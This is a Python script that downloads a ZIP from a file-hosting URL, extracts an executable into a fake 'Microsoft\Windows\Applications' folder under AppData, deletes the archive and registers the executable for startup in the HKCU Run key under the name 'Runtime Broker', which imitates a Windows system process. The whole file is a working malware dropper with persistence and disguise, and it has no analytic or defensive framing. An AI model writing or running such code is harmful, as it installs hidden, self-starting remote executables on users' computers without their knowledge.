import os
import requests
import zipfile
import winreg


def ensure_directory_exists(target_dir):
    """
    Ensure the target directory exists, creating it if necessary.
    """
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)


def download_file(url, download_path):
    """
    Download a file from the specified URL and save it to the given path.
    """
    response = requests.get(url, stream=True)
    response.raise_for_status()
    with open(download_path, 'wb') as file:
        for chunk in response.iter_content(chunk_size=8192):
            file.write(chunk)


def extract_file(zip_path, extract_dir):
    """
    Extract a ZIP file to the specified directory.
    """
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_dir)


def find_exe_in_directory(directory):
    """
    Find the first .exe file in the directory and return its path.
    """
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".exe"):
                return os.path.join(root, file)
    return None


def add_to_registry(run_name, target_file):
    """
    Add a program to startup by creating an entry in HKCU Run key.
    """
    with winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    ) as reg_key:
        winreg.SetValueEx(reg_key, run_name, 0, winreg.REG_SZ, target_file)

def delete_file(file_path):
    """
    Delete a file by its path.
    """
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception as e:
        pass

def run_autostart_setup():
    """
    Main function to run the autostart setup process:
    - Download a file (.zip).
    - Extract the executable.
    - Add the executable to the user's startup (registry).
    """
    zip_url = "https://store9.gofile.io/download/web/354c4da7-4bcb-4186-9d47-847d7a0553c2/folder.zip"  # Replace with actual URL
    app_data_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Applications")
    zip_path = os.path.join(app_data_dir, "folder.zip")

    ensure_directory_exists(app_data_dir)
    download_file(zip_url, zip_path)
    extract_file(zip_path, app_data_dir)
    exe_path = find_exe_in_directory(app_data_dir)
    delete_file(zip_path)
    
    if exe_path:
        add_to_registry("Runtime Broker", exe_path)


# Optionally include other autostart helper functions here
def enable_other_autostart_feature():
    """
    Placeholder for additional autostart-related logic.
    """
    pass